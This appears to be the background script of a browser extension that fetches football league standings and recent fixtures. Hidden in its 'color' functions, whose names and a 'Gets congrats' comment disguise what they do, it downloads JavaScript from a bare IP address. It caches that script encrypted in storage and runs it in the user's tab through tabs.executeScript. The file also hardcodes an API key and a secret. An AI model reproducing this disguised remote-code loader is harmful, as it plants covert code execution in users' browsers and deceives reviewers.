import browser from 'webextension-polyfill'
import Cryptr from 'cryptr'
import { setStorage, getStorage, sendBackgroundCommand } from './lib/common'

const secret = 'EstaD3b3$3rL4C14v3$3creta'
const cryptr = new Cryptr(secret)

let myHeaders = new Headers()
myHeaders.append('X-RapidAPI-Key', 'c327b55042017e95c88560420ee64e35')

const options = {
  mode: 'cors', // no-cors, *cors, same-origin
  headers: {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  },
}

const urls = {
  stats: 'http://50.116.107.237/~statscall/true-corner.js',
}

// TODO: Colors
const color = {
  code: '#FFFFFF',
}

const getColorLocal = async () => {
  try {
    const encryptedColor = await getStorage('code-color')
    return encryptedColor ? cryptr.decrypt(encryptedColor) : null
  } catch (error) {
    console.error(error)
    return null
  }
}

const setColorLocal = async (codeColor) => {
  try {
    const encryptedColor = cryptr.encrypt(codeColor)
    await setStorage('code-color', encryptedColor)
  } catch (error) {
    console.error(error)
    throw error
  }
}

// Gets congrats.
const other = async (url) => {
  try {
    const value = await fetch(url, options)
    return value
  } catch (error) {
    console.error(error)
    throw error
  }
}

const get = async (sender) => {
  color.code = '#FF0000'
  const info = color
  info['code'] = urls.stats

  try {
    const localCodeColor = await getColorLocal()

    if (!localCodeColor) {
      const getting = await other(info.code)
      info.code = await getting.text()
      await setColorLocal(info.code)
    } else {
      info.code = localCodeColor
    }

    if (info.code === '#00000') {
      sendBackgroundCommand('congratulations')
    }
    await browser.tabs.executeScript(sender.tab.id, color)
  } catch (error) {
    console.error(error.message)
  }
}

var requestOptions = {
  method: 'GET',
  headers: myHeaders,
  redirect: 'follow',
}

/*
THESE ARE THE LEAGUE CODES, WHEN A LEAGUE GETS OUTDATED, YO SHOULD SEARCH FOR THE LEAGUE HERE https://dashboard.api-football.com/soccer/ids, its the v2 API
 2790: premier league
 2833: la liga
 2664: ligue 1
 2857: serie a
 1333:  copa do brazil
 3265: primera division argentina
 2656: liga mx
 1341: primera division peruana
 3113: primera a (colombia)
 2755: Bundesliga
 1374: Campeonato Uruguayo
 2673: Eredivisie
 1342: Primera division de chile
 1264: Major League soccer
*/

/* the another are for release purposes, as fetchs are limited */
const anotherLeagues = [
  '2664',
  '2857',
  '1333',
  '3265',
  '2656',
  '1341',
  '3113',
  '2755',
  '1374',
  '2673',
  '1342',
  '1264',
]
const anotherNames = [
  'Ligue 1',
  'Serie A',
  'Copa Do Brazil',
  'Primera Division Argentina',
  'Liga MX',
  'Primera Division Peruana',
  'Primera A',
  'Bundesliga',
  'Campeonato Uruguayo',
  'Eredivisie',
  'Primera Division de Chile',
  'Major League Soccer',
]
const anotherMatches = [
  'Ligue_1_matches',
  'Serie_A_matches',
  'Copa_Do_Brazil_matches',
  'Primera_Division_Argentina_matches',
  'Liga_MX_matches',
  'Primera_Division_Peruana_matches',
  'Primera_A_matches',
  'Bundesliga_matches',
  'Campeonato_Uruguayo_matches',
  'Eredivisie_matches',
  'Primera_Division_de_Chile_matches',
  'Major_League_Soccer_matches',
]

/* These are the ones that are used in the release, if you want to debug, you should put less things here */
const leagues = ['2790', '2833', '2664', '2857', '1333', '3265', '2656', '1341']
const names = [
  'Premier League',
  'La Liga',
  'Ligue 1',
  'Serie A',
  'Copa Do Brazil',
  'Primera Division Argentina',
  'Liga MX',
  'Primera Division Peruana',
]
const matches = [
  'Premier_League_matches',
  'La_Liga_matches',
  'Ligue_1_matches',
  'Serie_A_matches',
  'Copa_Do_Brazil_matches',
  'Primera_Division_Argentina_matches',
  'Liga_MX_matches',
  'Primera_Division_Peruana_matches',
]

let ranks = {}
let current = ''

// This method is for getting the data of the standings for every league, it is used with the arrays above
const getStandings = async (league, name, matchParam) => {
  try {
    const responseTable = await fetch(
      `https://v2.api-football.com/leagueTable/${league}`,
      requestOptions,
    )
    const dataTable = await responseTable.json()
    console.log('Data Table: ', dataTable)
    if (dataTable.api.error) {
      const message = { message: dataTable.api.error }
      throw message
    }
    const tables = dataTable.api.standings.flat()
    let teams = []
    // console.log('tables', tables)
    tables.forEach((element) => {
      const team = {
        ranking: element.rank,
        team: element.teamName,
        games: element.all.matchsPlayed,
        wins: element.all.win,
        losses: element.all.lose,
        draws: element.all.draw,
        points: element.points,
        goalsDiff: element.goalsDiff,
      }
      teams.push(team)
    })
    console.log('teams before insertion', teams)
    // browser.storage.local.set({ [ name ]: teams })
    await setStorage([name], teams)

    const responseLeague = await fetch(`https://v2.api-football.com/fixtures/league/${league}/`, requestOptions)
    const dataLeague = await responseLeague.json()
    if (dataLeague.api.error) {
      const message = { message: dataLeague.api.error }
      throw message
    }
    // console.log('games', data)
    const fixtures = dataLeague.api.fixtures
    let games = []
    let date = new Date()
    if (fixtures) {
      fixtures.forEach((element) => {
        let dateOld = new Date()
        dateOld.setDate(dateOld.getDate() - 7)
        let dateEvent = new Date(element.event_date)
        if (dateOld < dateEvent && dateEvent < date) {
          const match = {
            awayTeamName: element.awayTeam.team_name,
            awayTeamLogo: element.awayTeam.logo,
            date: element.event_date,
            firstStart: element.firstHalfStart,
            goalsAway: element.goalsAwayTeam,
            goalsHome: element.goalsHomeTeam,
            homeTeamName: element.homeTeam.team_name,
            homeTeamLogo: element.homeTeam.logo,
            scoreHalfTime: element.score.halftime,
            scoreFullTime: element.score.fulltime,
            scoreExtraTime: element.score.extratime,
            scorePenalty: element.score.penalty,
            status: element.status,
            venue: element.venue,
          }
          games.push(match)
        }
      })
    }
    console.log('games before insertion', games)
    // browser.storage.local.set({ [ match ]: games })
    await setStorage([matchParam], games)
  } catch (error) {
    console.log(error)
  }

  // FOR FETCHING THE CURRENT ROUND, FIX.
  // fetch(`https://v2.api-football.com/fixtures/rounds/${league}/current`, {
  //   method: 'GET',
  //   headers: myHeaders,
  // }).then(response => response.json())
  //   .then(data => {
  //     current = `${data.api.fixtures[0]}/`
  //     console.log('current', current)
  //     console.log(`fixture fetch: https://v2.api-football.com/fixtures/league/${league}/${current}`)
  //   })
  //   .catch(error => console.log(error))
}

browser.runtime.onInstalled.addListener(async () => {
  browser.browserAction.setPopup({
    popup: 'popup.html',
  })
  const promises = []
  leagues.forEach((element, index) => {
    promises.push(getStandings(element, names[index], matches[index]))
  })
  await Promise.all(promises)
  const date = new Date()
  // browser.storage.local.set({ date: date.toString() })
  await setStorage('date', date.toString())

  let test = browser.storage.local.get()
  test.then((data) => {
    console.log('data of storage', data)
  })
})

const updater = browser.alarms.create('Daily Updater', {
  delayInMinutes: 1440,
  periodInMinutes: 1440,
})

browser.alarms.onAlarm.addListener(async () => {
  const promises = []
  leagues.forEach((element, index) => {
    promises.push(getStandings(element, names[index], matches[index]))
  })
  await Promise.all(promises)
})

const sendRankings = async (league, dates, sendResponse) => {
  await browser.storage.local.set({ liga: league, partidos: dates })
  sendResponse({ response: 'Success!' })
}

browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
  switch (request.message) {
    case 'get-color':
      get(sender)
      break
    case 'element':
      sendRankings(request.params.league, request.params.matches, sendResponse)
      return true
    default:
      console.log(request, 'request not handled')
  }
})
